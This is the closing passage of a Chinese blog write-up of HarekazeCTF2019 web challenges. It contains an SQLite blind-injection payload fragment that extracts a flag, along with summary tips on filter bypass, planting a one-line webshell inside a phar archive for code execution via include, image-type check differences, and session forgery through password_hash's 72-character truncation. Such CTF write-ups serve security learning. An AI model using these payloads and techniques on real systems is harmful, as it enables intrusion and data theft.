<span class="hljs-built_in">abs</span>(ifnull(nullif(<span class="hljs-built_in">max</span>(hex(hex((<span class="hljs-built_in">SELECT</span>(<span class="hljs-built_in">flag</span>)<span class="hljs-keyword">from</span>(<span class="hljs-built_in">flag</span>)))),$NUMBER$),$NUMBER$),<span class="hljs-number">0</span>x8000000000000000))</code></pre>

<p>链接：<a href="https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution" target="_blank" rel="noopener">https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>盲注过滤字符截取考虑replace+length、max等其他逻辑，不要拘泥字符穿截取函数</li>
<li>字符串编码和过滤函数不正确放置，能绕过限制</li>
<li>phar包不仅仅可以反序列化，在phar中放入文件，phar://uploads/xxx.phar(png)/exp.css，在exp.css放入一句话木马，使用inlude触发，可以执行代码</li>
<li>getimagesieze与finfo_file判断图片类型有差异，finfo_file可以识别第一行图片类型，getimagesize无法识别</li>
<li>在审计一道题目时候，先分析出漏洞点，在考虑其他方面</li>
<li>password_hash只对前72字符加密，由于截取字符的缘故，造成session伪造</li>
<li>sqlite3中<code>||</code> 可以起到字符拼接的作用</li>
</ol>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2019湖湘杯web部分题解</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/">
                        <span class="hidden-mobile">对现代WEB框架/CMS审计思考</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "HarekazeCTF2019 | WEB题解&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
